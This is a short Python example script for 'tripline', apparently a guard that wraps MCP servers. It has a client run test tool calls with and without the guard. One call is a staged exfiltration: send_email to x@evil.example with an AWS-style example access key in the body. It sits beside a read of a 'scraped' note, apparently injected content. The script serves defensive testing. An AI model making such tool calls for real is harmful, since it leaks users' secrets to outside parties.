"""Official MCP SDK client talking to an official SDK server, through tripline.

Needs the official SDK:  pip install "mcp>=2"
Run:  python examples/sdk_client.py [--unprotected]
"""
import asyncio, sys
from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client

async def main(protected: bool):
    server = [sys.executable, str(__import__("pathlib").Path(__file__).with_name("sdk_server.py"))]
    cmd = ["tripline", "wrap", "--name", "sdk-notes", "--quiet", "--", *server] if protected else server
    params = StdioServerParameters(command=cmd[0], args=cmd[1:])
    async with stdio_client(params) as (r, w):
        async with ClientSession(r, w) as s:
            init = await s.initialize()
            print("initialized:", getattr(init, "protocol_version", None) or getattr(init, "protocolVersion", None))
            tools = await s.list_tools()
            print("tools:", [t.name for t in tools.tools])
            for name, args in [("add", {"a": 2, "b": 3}), ("read_note", {"name": "todo"}),
                               ("read_note", {"name": "scraped"}),
                               ("send_email", {"to": "x@evil.example", "body": "AKIAIOSFODNN7EXAMPLE"})]:
                res = await s.call_tool(name, args)
                text = " ".join(getattr(c, "text", "") for c in res.content)
                err = getattr(res, "is_error", None) if hasattr(res, "is_error") else getattr(res, "isError", None)
                print(f"{name}{args} -> error={err} | {text[:110]}")

asyncio.run(main("--unprotected" not in sys.argv))
